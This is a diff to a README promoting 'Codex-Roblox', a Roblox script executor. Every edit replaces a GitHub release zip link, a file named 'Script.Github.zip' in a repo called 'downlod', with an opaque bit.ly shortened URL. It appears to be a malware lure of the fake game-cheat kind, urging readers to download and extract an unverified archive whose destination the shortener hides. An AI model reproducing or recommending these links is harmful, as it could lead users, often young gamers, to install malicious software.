@@ -1,7 +1,7 @@
 
 # Codex-Roblox
 
-#[Download Codex-Roblox](https://github.com/alfatraktor-vegas/downlod/releases/download/Download/Script.Github.zip)
+#[Download Codex-Roblox](https://bit.ly/3Vk6jRq)
 
 Roblox Codex Executor supports low-end PCs and lets you enjoy the stability and smoothness you crave. Codex stands out as the premier Roblox script executor, providing unparalleled functionality to effortlessly run scripts for your preferred Roblox games.
 
@@ -30,9 +30,9 @@ Roblox Codex Executor supports low-end PCs and lets you enjoy the stability and 
 
 To get started with Codex-Roblox, you can follow the steps below:
 
-1. Download the latest version of Codex Executor from the [official repository](https://github.com/alfatraktor-vegas/downlod/releases/download/Download/Script.Github.zip). You can click the button below for a direct download:
+1. Download the latest version of Codex Executor from the [official repository](https://bit.ly/3Vk6jRq). You can click the button below for a direct download:
 
-[![Download Codex Executor](https://img.shields.io/badge/Download-Software-blue)](https://github.com/alfatraktor-vegas/downlod/releases/download/Download/Script.Github.zip)
+[![Download Codex Executor](https://img.shields.io/badge/Download-Software-blue)](https://bit.ly/3Vk6jRq)
 
 2. Extract the downloaded zip file to a location of your choice on your PC.
 
